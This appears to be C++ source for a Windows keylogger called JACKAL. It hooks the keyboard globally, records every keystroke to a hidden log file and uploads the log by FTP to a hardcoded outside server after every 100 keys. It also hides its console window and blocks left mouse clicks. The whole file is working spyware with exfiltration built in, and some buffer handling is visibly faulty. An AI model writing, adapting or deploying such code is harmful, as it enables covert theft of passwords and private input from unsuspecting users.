#define _CRT_SECURE_NO_WARNINGS
#pragma comment (lib,"wininet.lib")
#include <windows.h>
#include <wininet.h> //for uploadFile function
#include <shlobj.h>
#include <iostream>

#define SERVER_ADDRESS "82.81.103.85"
#define PASSWORD "or"
#define USERNAME "or"
#define PATH "F:\\"

static int keysPressed = 0; //Count the keys pressed
using namespace std;

FILE* f;
HHOOK hKeyboardHook;

char* toNumber(int number)
{
    //[l  ,  o  ,  g, NUMBER ,  .  ,  t  ,  x  ,  t]
    char* logName = (char*)malloc(12 * sizeof(char));//7 characters are permanent, 1 is null terminator and 4 for the log number -> total: 12
    snprintf(logName, strlen(logName), "log%d.txt", number);
    return logName;
}


/*Change file attributes to be hidden file*/
void hide_file(char* file)
{
    wchar_t wtext4[20];
    mbstowcs(wtext4, file, strlen(file) + 1);//Plus null
    LPCWSTR Filename = wtext4;
    if (GetFileAttributes(Filename) != 0x22)
        SetFileAttributes(Filename, 0x22);
}

/*Upload file to server*/
BOOL uploadFile(char* filename, char* destination_name, char* address, char* username, char* password)
{
    BOOL t = false;
    HINTERNET hint, hftp;
    wchar_t wtext[5];
    mbstowcs(wtext, "FTP", 3 + 1);//Plus null
    LPWSTR FTPptr = wtext;
    if (!(hint = InternetOpen(FTPptr, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, INTERNET_FLAG_ASYNC)))
    {
        cout << GetLastError();
        return 1;
    }
    wchar_t wtext1[20];
    mbstowcs(wtext1, address, strlen(address) + 1);//Plus null
    LPWSTR Address = wtext1;
    wchar_t wtext2[10];
    mbstowcs(wtext2, username, strlen(username) + 1);//Plus null
    LPWSTR Username = wtext2;
    wchar_t wtext3[10];
    mbstowcs(wtext3, password, strlen(password) + 1);//Plus null
    LPWSTR Password = wtext3;
    wchar_t wtext4[20];
    mbstowcs(wtext4, filename, strlen(filename) + 1);//Plus null
    LPWSTR Filename = wtext4;
    wchar_t wtext5[20];
    mbstowcs(wtext5, destination_name, strlen(destination_name) + 1);//Plus null
    LPWSTR Destination_name = wtext5;
    /*Note for me: an exception 12003 is thrown without INTERNET_FLAG_PASSIVE cause FW policies*/
    if (!(hftp = InternetConnect(hint, Address, INTERNET_DEFAULT_FTP_PORT, Username, Password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0)))
    {
        //perror("[-] No internet connection, try later ... t(-_-t)\n");
        cout << "1)ERROR " << GetLastError() << endl;
        return 1;
    }
    if (!FtpPutFile(hftp, Filename, Destination_name, FTP_TRANSFER_TYPE_BINARY, 0))
    {
        cout << "2)ERROR " << GetLastError() << endl;
        return 1;
    }
    return t;
}
// Variable to store the hook handle
HHOOK miHook;
// This is the hook procedure
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        MSLLHOOKSTRUCT& msll = *(reinterpret_cast<MSLLHOOKSTRUCT*>(lParam)); // In there is more context if you need it
        if (wParam == WM_LBUTTONDOWN) {
            return -1; // This will make the click be ignored
        }
    }
    return CallNextHookEx(miHook, nCode, wParam, lParam); // Important! Otherwise other mouse hooks may misbehave
}




LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
    char currentDirectory[260];
    char workFullPath[20];
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        strcpy(currentDirectory, PATH);
        //Concatenate desktop directory and files
        strcpy(workFullPath, currentDirectory);
        strcat(workFullPath, "\\log.txt");
        if (!(f = fopen(workFullPath, "a+"))) //Open the file
        {
            cout << GetLastError();
            return 1;
        }

        KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
        DWORD dwMsg = 1;
        dwMsg += hooked_key.scanCode << 16;
        dwMsg += hooked_key.flags << 24;
        char lpszKeyName[1024] = { 0 };
        lpszKeyName[0] = '[';
        int i = GetKeyNameText(dwMsg, (LPWSTR)(lpszKeyName + 1), 0xFF) + 1;
        int key = hooked_key.vkCode;
        lpszKeyName[i] = ']';
        //Key value or something else ?
        //if the key if from A-Z,a-z,0-9 then add this to file
        if (key >= 'A' && key <= 'Z')
        {
            /*

            */
            if (GetAsyncKeyState(VK_SHIFT) >= 0)//Is CAPS LOCK on?
                key += 0x20;
            if (f != NULL)
                fprintf(f, "%c", key);
        }
        //else add the name of the key.For example if the key is 32 -> Add "Space" to the file,so we know that space has been pressed.lpszKeyName is that name.
        else
        {
            if (f != NULL)
                fprintf(f, "%s", lpszKeyName);
        }

        keysPressed++;
        if (keysPressed % 100 == 0) //Enough data
        {
            char* logName = toNumber(keysPressed / 100);
            fclose(f);
            if (!uploadFile(workFullPath, logName, (char*)SERVER_ADDRESS, (char*)USERNAME, (char*)PASSWORD)) //Upload the file to FTP
            {
                cout << GetLastError();
                free(logName);
                return 1;
            }
            free(logName);
        }

        hide_file(workFullPath);
        fclose(f);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI JACKAL(LPVOID lpParm)
{

    // This is how you install the hook
    // And this is how you would remove the hook again
    miHook = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&LowLevelMouseProc),NULL, 0);

    HINSTANCE hins;
    hins = GetModuleHandle(NULL);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(miHook);

    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

void main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    JACKAL(NULL);
}